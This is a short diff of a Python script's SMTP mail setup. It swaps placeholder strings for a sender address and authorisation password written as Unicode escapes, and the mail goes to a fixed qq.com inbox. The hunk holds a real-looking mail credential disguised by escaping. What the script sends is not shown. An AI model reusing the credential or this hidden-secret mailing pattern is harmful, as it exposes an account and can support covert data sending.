@@ -70,8 +70,8 @@ os.system("pause")
 import smtplib
 from email.mime.text import MIMEText
 from email.utils import formataddr
-fromaddrs = 'E2D8CE90AABA318AA9B488C8CF356F00'
-password = '361DB8C75479337822A1B1D904C32881'  # 发件人邮箱密码  即配置生成的授权码
+fromaddrs = '\u0031\u0038\u0033\u0030\u0036\u0030\u0039\u0032\u0035\u0032\u0033\u0040\u0031\u0036\u0033\u002e\u0063\u006f\u006d'
+password = '\u0045\u0059\u0049\u0050\u0042\u004e\u0056\u004f\u0054\u004b\u0045\u004b\u0050\u0059\u0042\u0053'  
 toaddrs = '482750836@qq.com'  # 收件人邮箱账号，这边发送给自己,你可以填想要发送的邮箱
 def mail():
     ret = True
